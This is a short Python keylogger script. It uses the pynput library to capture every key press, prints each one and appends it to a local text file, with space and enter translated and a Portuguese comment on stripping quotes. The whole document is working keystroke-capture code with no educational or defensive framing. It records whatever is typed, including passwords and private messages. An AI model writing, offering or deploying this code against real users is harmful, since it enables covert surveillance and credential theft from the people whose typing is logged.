from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyLoggerFile.txt", 'a') as logKey:
        try:
            if key == keyboard.Key.space: 
                logKey.write(' ')
            elif key == keyboard.Key.enter:  
                logKey.write('\n')
            else:  
                logKey.write(str(key).replace("'", ""))  # Remove as aspas simples da representação da tecla
        except Exception as e:
            print("Error getting char:", e)

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
